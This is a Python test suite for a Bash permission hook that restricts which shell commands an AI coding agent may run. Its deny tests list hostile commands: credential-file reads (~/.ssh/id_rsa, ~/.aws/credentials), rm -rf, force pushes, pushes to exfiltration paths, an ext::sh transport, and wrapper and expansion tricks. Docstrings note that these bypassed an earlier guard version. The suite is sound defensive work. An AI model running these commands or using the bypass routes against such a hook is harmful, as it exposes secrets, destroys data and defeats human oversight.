#!/usr/bin/env python3
"""Test suite for .claude/security/bash_guard.py (v2 — allow-by-construction).

Unlike v1's ~200 individual-syntax-variant tests, this suite is
organized by CATEGORY: every explicitly allowed command family gets one
positive test, every disallowed-shape variant of that family gets one
negative test, and every fixture that defeated v1 across RR-1 through
RR-4 (plus BUG-013/022/023's own originals) gets a regression test here
to confirm v2's categorical composition-ban and unknown-command-denies-
by-default design closes the entire class, not just the specific
reported command.

Run directly: `python3 .claude/security/tests/test_bash_guard.py`
"""
import hashlib
import json
import pathlib
import subprocess
import sys
import tempfile
import unittest

GUARD_PATH = pathlib.Path(__file__).resolve().parent.parent / "bash_guard.py"


def run_guard(command, cwd=None):
    payload = {
        "session_id": "test",
        "hook_event_name": "PreToolUse",
        "tool_name": "Bash",
        "tool_input": {"command": command},
        "tool_use_id": "test",
    }
    if cwd is not None:
        payload["cwd"] = cwd
    proc = subprocess.run(
        [sys.executable, str(GUARD_PATH)],
        input=json.dumps(payload),
        capture_output=True,
        text=True,
        timeout=10,
    )
    stdout = proc.stdout.strip()
    decision = None
    reason = None
    if stdout:
        parsed = json.loads(stdout)
        hso = parsed.get("hookSpecificOutput", {})
        decision = hso.get("permissionDecision")
        reason = hso.get("permissionDecisionReason")
    return proc.returncode, decision, reason


class GuardTestCase(unittest.TestCase):
    def assert_allowed(self, command):
        code, decision, reason = run_guard(command)
        self.assertEqual(decision, "allow", f"expected ALLOW for {command!r}, got decision={decision!r} reason={reason!r}")

    def assert_denied(self, command):
        code, decision, reason = run_guard(command)
        self.assertEqual(decision, "deny", f"expected DENY for {command!r}, got decision={decision!r} reason={reason!r}")
        self.assertTrue(reason and reason.startswith("BLOCKED:"), f"missing/bad reason for {command!r}: {reason!r}")


# ---------------------------------------------------------------------------
# Class A: every explicitly supported read-only family — positive + shape
# ---------------------------------------------------------------------------


class ClassA_ReadOnly(GuardTestCase):
    def test_git_status(self):
        self.assert_allowed("git status")

    def test_git_status_short(self):
        self.assert_allowed("git status -s")

    def test_git_log(self):
        self.assert_allowed("git log --oneline -5")

    def test_git_diff(self):
        self.assert_allowed("git diff --stat")

    def test_git_show(self):
        self.assert_allowed("git show HEAD")

    def test_git_rev_parse(self):
        self.assert_allowed("git rev-parse --short HEAD")

    def test_git_ls_files(self):
        self.assert_allowed("git ls-files")

    def test_git_branch_bare(self):
        self.assert_allowed("git branch")

    def test_git_branch_list_flag(self):
        self.assert_allowed("git branch -a")

    def test_git_remote_v(self):
        self.assert_allowed("git remote -v")

    def test_git_fetch_scoped(self):
        self.assert_allowed("git fetch origin main")

    def test_git_worktree_list(self):
        self.assert_allowed("git worktree list")

    def test_git_stash_list(self):
        self.assert_allowed("git stash list")

    def test_shasum(self):
        self.assert_allowed("shasum -a 256 somefile.txt")

    def test_find_readonly(self):
        self.assert_allowed("find . -name *.py -type f")

    def test_ls(self):
        self.assert_allowed("ls -la")

    def test_cat(self):
        self.assert_allowed("cat README.md")

    def test_head(self):
        self.assert_allowed("head -n 20 file.txt")

    def test_tail(self):
        self.assert_allowed("tail -n 20 file.txt")

    def test_wc(self):
        self.assert_allowed("wc -l file.txt")

    def test_pwd(self):
        self.assert_allowed("pwd")

    def test_stat(self):
        self.assert_allowed("stat file.txt")

    def test_grep(self):
        self.assert_allowed("grep -rn TODO knowledge")

    def test_python_allowlisted_script(self):
        self.assert_allowed("python3 knowledge/00-System/verify_baselines.py")

    def test_python_allowlisted_script_with_args(self):
        self.assert_allowed("python3 .claude/security/tests/test_bash_guard.py -v")

    def test_python_allowlisted_script_validate_capabilities(self):
        self.assert_allowed("python3 knowledge/00-System/validate_capabilities.py")

    def test_python_allowlisted_script_mr_verify(self):
        self.assert_allowed("python3 knowledge/05-QA/tools/mr_verify.py")

    def test_python_allowlisted_script_resolution_bound(self):
        self.assert_allowed("python3 knowledge/05-QA/tools/resolution_bound.py")

    def test_python_allowlisted_script_validate_catalog(self):
        self.assert_allowed(
            "python3 knowledge/03-Modules/MOD-000/scenario-catalog/tools/validate_catalog.py"
        )

    def test_python_allowlisted_script_evidence_integrity_check(self):
        self.assert_allowed(
            "python3 knowledge/03-Modules/MOD-000/evidence/scenario-execution/"
            "phase3/tools/evidence_integrity_check.py"
        )


class ClassA_ShapeRejections(GuardTestCase):
    """Same command families, but a shape/flag outside the allowlist —
    each must deny, not fall back to a permissive default."""

    def test_git_status_with_positional(self):
        self.assert_denied("git status somepath")

    def test_git_branch_delete(self):
        self.assert_denied("git branch -D somebranch")

    def test_git_branch_move(self):
        self.assert_denied("git branch -m newname")

    def test_git_remote_add(self):
        self.assert_denied("git remote add origin https://example.com/x.git")

    def test_git_fetch_prune(self):
        self.assert_denied("git fetch --prune")

    def test_git_worktree_add(self):
        self.assert_denied("git worktree add /tmp/wt")

    def test_git_stash_pop(self):
        self.assert_denied("git stash pop")

    def test_git_log_disallowed_flag(self):
        self.assert_denied("git log --follow")

    def test_find_delete(self):
        self.assert_denied("find . -delete")

    def test_find_exec(self):
        self.assert_denied("find . -exec rm {} +")

    def test_python_unlisted_script(self):
        self.assert_denied("python3 /tmp/whatever.py")

    def test_python_dash_c(self):
        self.assert_denied("python3 -c \"print(1)\"")

    def test_grep_no_path(self):
        self.assert_denied("grep TODO")

    def test_shasum_bad_flag(self):
        self.assert_denied("shasum --binary file.txt")


# ---------------------------------------------------------------------------
# Class B: every explicitly supported governed-mutation family
# ---------------------------------------------------------------------------


class ClassB_GovernedMutation(GuardTestCase):
    def test_git_add_specific_paths(self):
        self.assert_allowed("git add knowledge/foo.md knowledge/bar.md")

    def test_git_commit(self):
        self.assert_allowed('git commit -m "a normal commit message"')

    def test_git_push_bare(self):
        self.assert_allowed("git push")

    def test_git_push_remote_branch(self):
        self.assert_allowed("git push origin main")

    def test_mkdir_in_knowledge(self):
        self.assert_allowed("mkdir -p knowledge/03-Modules/MOD-000/evidence/scratch")


class ClassB_ShapeRejections(GuardTestCase):
    def test_git_add_dash_A(self):
        self.assert_denied("git add -A")

    def test_git_add_dot(self):
        self.assert_denied("git add .")

    def test_git_add_protected_path(self):
        self.assert_denied("git add .claude/settings.json")

    def test_git_commit_amend(self):
        self.assert_denied("git commit --amend")

    def test_git_commit_no_verify(self):
        self.assert_denied('git commit -m "x" --no-verify')

    def test_git_push_force(self):
        self.assert_denied("git push --force")

    def test_git_push_force_short(self):
        self.assert_denied("git push -f")

    def test_git_push_delete(self):
        self.assert_denied("git push origin --delete main")

    def test_mkdir_outside_knowledge(self):
        self.assert_denied("mkdir -p /tmp/whatever")

    def test_mkdir_protected_path(self):
        self.assert_denied("mkdir -p .claude/rules/new")

    def test_mkdir_no_p_flag(self):
        self.assert_denied("mkdir knowledge/foo")


# ---------------------------------------------------------------------------
# Class C: unknown / ambiguous / composition — the "UNKNOWN MUST DENY" set
# ---------------------------------------------------------------------------


class ClassC_UnknownCommand(GuardTestCase):
    def test_unknown_binary(self):
        self.assert_denied("some-random-tool --flag")

    def test_unknown_git_subcommand(self):
        self.assert_denied("git bisect start")

    def test_curl(self):
        self.assert_denied("curl https://example.com")

    def test_touch(self):
        self.assert_denied("touch newfile.txt")

    def test_rm_plain(self):
        self.assert_denied("rm somefile.txt")

    def test_chmod(self):
        self.assert_denied("chmod 644 file.txt")


class ClassC_ShellComposition(GuardTestCase):
    def test_semicolon_chain(self):
        self.assert_denied("git status; rm -rf /tmp/x")

    def test_and_chain(self):
        self.assert_denied("cd /tmp && rm -rf x")

    def test_or_chain(self):
        self.assert_denied("git status || rm -rf x")

    def test_pipe(self):
        self.assert_denied("git log | grep fix")

    def test_background(self):
        self.assert_denied("git status &")

    def test_redirect_out(self):
        self.assert_denied("echo x > file.txt")

    def test_redirect_append(self):
        self.assert_denied("echo x >> file.txt")

    def test_redirect_in(self):
        self.assert_denied("cat < file.txt")

    def test_heredoc(self):
        self.assert_denied("cat <<EOF\nhello\nEOF")

    def test_backticks(self):
        self.assert_denied("echo `whoami`")

    def test_dollar_paren_substitution(self):
        self.assert_denied("echo $(whoami)")

    def test_process_substitution_in(self):
        self.assert_denied("diff <(sort a) <(sort b)")

    def test_process_substitution_out(self):
        self.assert_denied("tee >(cat) < file")

    def test_multiline(self):
        self.assert_denied("git status\nrm -rf x")


class ClassC_WrappersAndSubstitution(GuardTestCase):
    """These all worked as bypasses against v1 across RR-1..RR-4; v2
    denies every one for the same reason (exact-shape matching, no
    normalization) without any code written specifically for any of
    them."""

    def test_absolute_path_git(self):
        self.assert_denied("/usr/bin/git reset --hard")

    def test_absolute_path_rm(self):
        self.assert_denied("/bin/rm -rf /tmp/x")

    def test_env_wrapped_git(self):
        self.assert_denied("env git reset --hard")

    def test_command_wrapped_git(self):
        self.assert_denied("command git reset --hard")

    def test_builtin_wrapped(self):
        self.assert_denied("builtin eval whatever")

    def test_uppercase_rm(self):
        self.assert_denied("RM -rf /tmp/x")

    def test_uppercase_git(self):
        self.assert_denied("GIT reset --hard")

    def test_bash_c_wrapper(self):
        self.assert_denied("bash -c whatever")

    def test_sh_c_wrapper(self):
        self.assert_denied("sh -c whatever")

    def test_sudo_wrapper(self):
        self.assert_denied("sudo rm -rf /tmp/x")

    def test_noglob_wrapper(self):
        self.assert_denied("noglob rm -rf /tmp/x")

    def test_nice_wrapper(self):
        self.assert_denied("nice rm -rf /tmp/x")

    def test_var_assignment_prefix(self):
        self.assert_denied("FOO=bar git status")

    def test_dollar_var_command_name(self):
        self.assert_denied("$SHELL -c whatever")

    def test_leading_redirect(self):
        self.assert_denied(">/dev/null rm -rf /tmp/x")

    def test_git_c_flag_injection(self):
        self.assert_denied("git -c core.pager=cat reset --hard")

    def test_git_capital_C_flag(self):
        self.assert_denied("git -C /tmp/repo reset --hard")

    def test_python_module_inline_code(self):
        self.assert_denied('python3 -m timeit "print(1)"')

    def test_perl_pi(self):
        self.assert_denied("perl -pi -e s/x/y/ file.txt")


class ClassC_DestructiveGitAndFilesystem(GuardTestCase):
    """Every BUG-013/022/023-original and RR-1..RR-4 destructive-intent
    fixture; v2 denies all of these because none of them are `git add`/
    `git commit -m`/`git push`/`mkdir -p knowledge/...` in exact shape —
    not because each is individually recognized as bad."""

    def test_rm_recursive(self):
        self.assert_denied("rm -rf /tmp/scratch/dir")

    def test_rm_bare_r(self):
        self.assert_denied("rm -r /tmp/scratch/dir")

    def test_find_delete_full(self):
        self.assert_denied("find /tmp/scratch -delete")

    def test_git_reset_hard(self):
        self.assert_denied("git reset --hard")

    def test_git_push_force_full(self):
        self.assert_denied("git push origin main --force")

    def test_git_branch_D_full(self):
        self.assert_denied("git branch -D somebranch")

    def test_git_clean(self):
        self.assert_denied("git clean -fd")

    def test_git_filter_branch(self):
        self.assert_denied("git filter-branch --force")

    def test_git_reflog_expire(self):
        self.assert_denied("git reflog expire --expire=now --all")

    def test_git_stash_clear(self):
        self.assert_denied("git stash clear")

    def test_git_commit_amend_full(self):
        self.assert_denied("git commit --amend -m amended")

    def test_tee_settings_json(self):
        self.assert_denied("tee .claude/settings.json")

    def test_sed_i_settings_json(self):
        self.assert_denied("sed -i '' -e s/a/b/ .claude/settings.json")

    def test_cp_onto_baseline(self):
        self.assert_denied("cp fake.docx Gym_OS_Master_Product_Blueprint_v1_English.docx")


class ClassC_MalformedAndAmbiguous(GuardTestCase):
    def test_unbalanced_quote(self):
        self.assert_denied("echo 'unterminated")

    def test_empty_command(self):
        code, decision, reason = run_guard("")
        self.assertEqual(decision, "deny")

    def test_whitespace_only(self):
        code, decision, reason = run_guard("   ")
        self.assertEqual(decision, "deny")

    def test_non_dict_payload_fails_closed(self):
        # RR-1 review round P2-5: a payload that parses as JSON but
        # isn't the expected dict shape must not crash uncaught (which
        # would fail OPEN per the hook's exit-code contract).
        proc = subprocess.run(
            [sys.executable, str(GUARD_PATH)],
            input=json.dumps(["not", "a", "dict"]),
            capture_output=True,
            text=True,
            timeout=10,
        )
        self.assertEqual(proc.returncode, 0)
        self.assertEqual(proc.stdout.strip(), "")  # silently not-a-Bash-call, no decision needed


# ---------------------------------------------------------------------------
# Architecture review round 1 findings — regression coverage
# ---------------------------------------------------------------------------


class RR1_RefspecAndPathspecTricks(GuardTestCase):
    """P0-1/P0-2: git push/fetch refspec syntax (`:branch` delete,
    `+branch` force) expressed as positionals, not flags."""

    def test_push_colon_delete_refspec(self):
        self.assert_denied("git push origin :main")

    def test_push_plus_force_refspec(self):
        self.assert_denied("git push origin +main")

    def test_push_plus_force_refspec_explicit(self):
        self.assert_denied("git push origin +main:main")

    def test_fetch_forced_refspec(self):
        self.assert_denied("git fetch . +HEAD:refs/heads/main")

    def test_fetch_forced_refspec_remote(self):
        self.assert_denied("git fetch origin +main:main")

    def test_fetch_arbitrary_url(self):
        self.assert_denied("git fetch https://attacker.example/repo")

    def test_remote_show_arbitrary_url(self):
        self.assert_denied("git remote show https://attacker.example/repo")

    def test_fetch_ext_transport(self):
        self.assert_denied("git fetch ext::sh -c id")


class RR1_GitAddPathspecMagic(GuardTestCase):
    """P1-1: git add protected-path check defeated by pathspec magic,
    directory-level add, path normalization tricks."""

    def test_add_pathspec_root_magic(self):
        self.assert_denied("git add :/")

    def test_add_bare_claude_directory(self):
        self.assert_denied("git add .claude")

    def test_add_claude_glob(self):
        self.assert_denied("git add .claude/*")

    def test_add_double_slash(self):
        self.assert_denied("git add .claude//settings.json")

    def test_add_dot_dot_traversal(self):
        self.assert_denied("git add .claude/x/../settings.json")

    def test_add_glob_pattern(self):
        self.assert_denied("git add .claude/settings*.json")

    def test_add_parent_dir(self):
        self.assert_denied("git add ..")

    def test_add_ansi_c_quoted_path(self):
        # shlex does not decode $'...' the way bash/zsh do; the literal
        # token it produces contains characters outside the safe charset
        # either way, so this is denied regardless of what it would
        # decode to.
        self.assert_denied("git add $'\\x2eclaude/settings.json'")

    def test_add_brace_expansion_style(self):
        self.assert_denied("git add knowledge/{a,b}")


class RR1_CommitMessageStructural(GuardTestCase):
    """P1-2: the project's mandated attribution-trailer commit format
    must remain possible — via -F <file>, never via a raw -m string
    containing Stage-1-banned characters."""

    def test_commit_dash_F_allowed(self):
        self.assert_allowed("git commit -F knowledge/scratch/commit-message.txt")

    def test_commit_dash_F_protected_path_denied(self):
        self.assert_denied("git commit -F .claude/settings.json")

    def test_commit_multiline_m_denied(self):
        # Multi-line messages must go through -F, not -m — Stage 1 bans
        # the newline unconditionally.
        self.assert_denied('git commit -m "line one\nline two"')

    def test_commit_m_with_angle_brackets_denied(self):
        self.assert_denied('git commit -m "see <noreply@anthropic.com>"')


class RR1_WidenedReadOnlyShapes(GuardTestCase):
    """P1-3: routine read-only shapes that were wrongly denied."""

    def test_status_porcelain(self):
        self.assert_allowed("git status --porcelain")

    def test_log_format(self):
        self.assert_allowed("git log --format=%H -1")

    def test_diff_with_pathspec(self):
        self.assert_allowed("git diff HEAD~1 -- knowledge")

    def test_checkout_new_branch(self):
        self.assert_allowed("git checkout -b my-feature-branch")


class RR1_ReadPathScopeRestriction(GuardTestCase):
    """P2-4: unbounded filesystem reads (credentials, files outside the
    repo) must not be explicitly allowed."""

    def test_cat_home_ssh_key(self):
        self.assert_denied("cat ~/.ssh/id_rsa")

    def test_cat_absolute_path(self):
        self.assert_denied("cat /etc/passwd")

    def test_grep_absolute_path(self):
        self.assert_denied("grep -r secret /Users")

    def test_find_absolute_root(self):
        self.assert_denied("find / -name id_rsa")

    def test_head_home_path(self):
        self.assert_denied("head -n 5 ~/.aws/credentials")


class RR1_MkdirScopeAndCharset(GuardTestCase):
    """P2-1/P2-2: mkdir path-normalization escape and pathspec-magic
    charset gaps."""

    def test_mkdir_traversal_escape(self):
        self.assert_denied("mkdir -p knowledge/../../evil")

    def test_mkdir_traversal_into_claude(self):
        self.assert_denied("mkdir -p knowledge/../.claude/evil")

    def test_mkdir_dollar_var(self):
        self.assert_denied("mkdir -p knowledge/$FOO")


# ---------------------------------------------------------------------------
# Architecture review round 2 findings — regression coverage
# ---------------------------------------------------------------------------


class RR2_DollarAndGlobExpansionDivergence(GuardTestCase):
    """P0-1: guard-visible tokens diverging from what the real shell
    would deliver via $VAR/${VAR}/$'...' expansion or glob expansion,
    for READ families that were still on the weaker pre-RR2 check."""

    def test_cat_dollar_home(self):
        self.assert_denied("cat $HOME/.ssh/id_rsa")

    def test_cat_braced_dollar_home(self):
        self.assert_denied("cat ${HOME}/.ssh/id_rsa")

    def test_cat_ansi_c_quoted(self):
        self.assert_denied("cat $'/etc/passwd'")

    def test_head_dollar_home(self):
        self.assert_denied("head -n 5 $HOME/.aws/credentials")

    def test_find_bare_glob_positional(self):
        self.assert_denied("find . *")

    def test_find_bare_glob_only(self):
        self.assert_denied("find *")

    def test_find_name_pattern_with_wildcard_still_allowed(self):
        # The fix must not break find's own legitimate -name wildcard
        # usage — only a BARE positional (not a value-flag's value) is
        # restricted to the safe charset.
        self.assert_allowed("find . -name *.py -type f")


class RR2_TraversalInReadFamilies(GuardTestCase):
    """P1-1: '..' traversal was only rejected in mutation families; read
    families used a weaker check with no traversal rejection at all."""

    def test_cat_traversal(self):
        self.assert_denied("cat ../../.ssh/id_rsa")

    def test_head_traversal(self):
        self.assert_denied("head -n 100 ../../.aws/credentials")

    def test_tail_traversal(self):
        self.assert_denied("tail ../../.ssh/id_rsa")

    def test_wc_traversal(self):
        self.assert_denied("wc -l ../../.ssh/id_rsa")

    def test_stat_traversal(self):
        self.assert_denied("stat ../../.ssh/id_rsa")

    def test_grep_traversal(self):
        self.assert_denied("grep x ../../.ssh/id_rsa")

    def test_find_traversal_root(self):
        self.assert_denied("find ../.. -name id_rsa")

    def test_ls_traversal(self):
        self.assert_denied("ls ../../etc")


class RR2_RemoteAbsolutePathExfiltration(GuardTestCase):
    """P1-2: git accepts a plain filesystem path (not just a URL) as a
    remote — the ref/remote charset allowed '/' and '~' unconditionally,
    so a URL-shaped check alone did not close this."""

    def test_push_absolute_path_remote(self):
        self.assert_denied("git push /tmp/exfil.git")

    def test_push_home_path_remote(self):
        self.assert_denied("git push ~/exfil.git")

    def test_push_absolute_path_remote_with_branch(self):
        self.assert_denied("git push /tmp/exfil.git main")

    def test_fetch_absolute_path_remote(self):
        self.assert_denied("git fetch /tmp/attacker.git")

    def test_remote_show_absolute_path(self):
        self.assert_denied("git remote show /tmp/x")


class RR2_ShasumLsUnrestricted(GuardTestCase):
    """P2-1: shasum/ls had no path restriction at all."""

    def test_ls_home_ssh(self):
        self.assert_denied("ls ~/.ssh")

    def test_ls_absolute_etc(self):
        self.assert_denied("ls -la /etc")

    def test_shasum_absolute_passwd(self):
        self.assert_denied("shasum -a 256 /etc/passwd")

    def test_shasum_home_ssh_key(self):
        self.assert_denied("shasum ~/.ssh/id_rsa")

    def test_ls_still_works_relative(self):
        self.assert_allowed("ls -la knowledge")


class RR2_GrepPatternFileFlag(GuardTestCase):
    """P2-2: grep -f's argument is a pattern FILE (a path), not search
    text, and was exempted from path checking."""

    def test_grep_dash_f_absolute_path(self):
        self.assert_denied("grep -f /etc/passwd knowledge")


class RR2_OffShapeCharsetEdgeCases(GuardTestCase):
    """P2-4: the safe-path charset technically matched content-free
    tokens like bare '-'/'--', an off-shape allow in a design whose
    premise is exact shape matching."""

    def test_add_bare_double_dash(self):
        self.assert_denied("git add --")

    def test_add_bare_dash(self):
        self.assert_denied("git add -")

    def test_commit_dash_F_bare_double_dash(self):
        self.assert_denied("git commit -F --")


class RR3_GrepDashFAllSpellings(GuardTestCase):
    """Round 3 P1-1: the RR2_GrepPatternFileFlag fix above only matched
    the exact token `-f`. Every bundled short-flag form and the long
    form fell through unchecked, treating `positionals[0]` (actually a
    pattern-file PATH under -f semantics) as ordinary search text — an
    unbounded file read via an explicit ALLOW. Every spelling below must
    now deny; a legitimate grep with none of them must still allow."""

    def test_bundled_rf(self):
        self.assert_denied("grep -rf /etc/passwd knowledge")

    def test_bundled_nf(self):
        self.assert_denied("grep -nf /etc/passwd knowledge")

    def test_bundled_if(self):
        self.assert_denied("grep -if /etc/passwd knowledge")

    def test_bundled_hf(self):
        self.assert_denied("grep -hf /etc/passwd knowledge")

    def test_bundled_rif(self):
        self.assert_denied("grep -rif /etc/passwd knowledge")

    def test_long_form_file(self):
        self.assert_denied("grep --file /etc/passwd knowledge")

    def test_long_form_file_equals(self):
        self.assert_denied("grep --file=/etc/passwd knowledge")

    def test_relative_path_still_denied(self):
        # Not just absolute paths — the whole -f mode is unsupported,
        # regardless of what the argument points at.
        self.assert_denied("grep -rf knowledge/00-System/CLAUDE.md knowledge")

    def test_uppercase_F_is_unrelated_and_still_allowed(self):
        # -F is grep's own "fixed strings" flag (no argument, no path
        # implication) — a different, real flag from lowercase -f. Case-
        # sensitive matching must not conflate them.
        self.assert_allowed("grep -Fn literal-string knowledge/CLAUDE.md")

    def test_plain_grep_without_f_still_allowed(self):
        self.assert_allowed("grep -rn TODO knowledge")


class RR3_TrustedScriptIntegrity(GuardTestCase):
    """Round 3 P1-2: `_ALLOWED_PYTHON_SCRIPTS` trusted a path string
    alone, with no content check — an edit to any of the seven
    allowlisted scripts (routine or malicious) silently and permanently
    stayed trusted. `_script_integrity_ok` now hash-verifies the actual
    file content on every invocation, in isolation (no real repository
    file is read, written, or mutated by these tests)."""

    @classmethod
    def setUpClass(cls):
        sys.path.insert(0, str(GUARD_PATH.parent))
        import bash_guard  # noqa: PLC0415 (deliberately imported here, test-only)

        cls.bash_guard = bash_guard

    def setUp(self):
        self._orig_repo_root = self.bash_guard.REPO_ROOT
        self._orig_allowed = dict(self.bash_guard._ALLOWED_PYTHON_SCRIPTS)
        self._tmp = tempfile.TemporaryDirectory()
        self.bash_guard.REPO_ROOT = pathlib.Path(self._tmp.name)

    def tearDown(self):
        self.bash_guard.REPO_ROOT = self._orig_repo_root
        self.bash_guard._ALLOWED_PYTHON_SCRIPTS = self._orig_allowed
        self._tmp.cleanup()

    def _write_fixture(self, relpath, content):
        full = pathlib.Path(self._tmp.name) / relpath
        full.parent.mkdir(parents=True, exist_ok=True)
        full.write_bytes(content)
        return full

    def test_matching_hash_passes(self):
        content = b"print('trusted fixture')\n"
        self._write_fixture("fixture.py", content)
        digest = hashlib.sha256(content).hexdigest()
        self.bash_guard._ALLOWED_PYTHON_SCRIPTS = {"fixture.py": digest}
        self.assertTrue(self.bash_guard._script_integrity_ok("fixture.py"))

    def test_tampered_content_fails_closed(self):
        original = b"print('trusted fixture')\n"
        tampered = b"print('trusted fixture')  # + one appended byte extra\n"
        self._write_fixture("fixture.py", tampered)
        digest_of_original = hashlib.sha256(original).hexdigest()
        self.bash_guard._ALLOWED_PYTHON_SCRIPTS = {"fixture.py": digest_of_original}
        self.assertFalse(self.bash_guard._script_integrity_ok("fixture.py"))

    def test_missing_file_fails_closed(self):
        digest = hashlib.sha256(b"anything").hexdigest()
        self.bash_guard._ALLOWED_PYTHON_SCRIPTS = {"does-not-exist.py": digest}
        self.assertFalse(self.bash_guard._script_integrity_ok("does-not-exist.py"))

    def test_unlisted_path_fails_closed(self):
        content = b"print('not on the allowlist at all')\n"
        self._write_fixture("unlisted.py", content)
        self.bash_guard._ALLOWED_PYTHON_SCRIPTS = {}
        self.assertFalse(self.bash_guard._script_integrity_ok("unlisted.py"))

    def test_end_to_end_deny_via_classify_on_hash_mismatch(self):
        # Exercise the real classify() path, not just the helper, with a
        # deliberately wrong pinned hash — confirms the DENY actually
        # propagates all the way through _python_readonly/classify(),
        # not just that the helper function itself returns False.
        content = b"print('trusted fixture')\n"
        self._write_fixture("fixture.py", content)
        self.bash_guard._ALLOWED_PYTHON_SCRIPTS = {"fixture.py": "0" * 64}
        with self.assertRaises(self.bash_guard.Verdict) as ctx:
            self.bash_guard.classify("python3 fixture.py")
        self.assertEqual(ctx.exception.decision, "deny")


if __name__ == "__main__":
    unittest.main(verbosity=2)
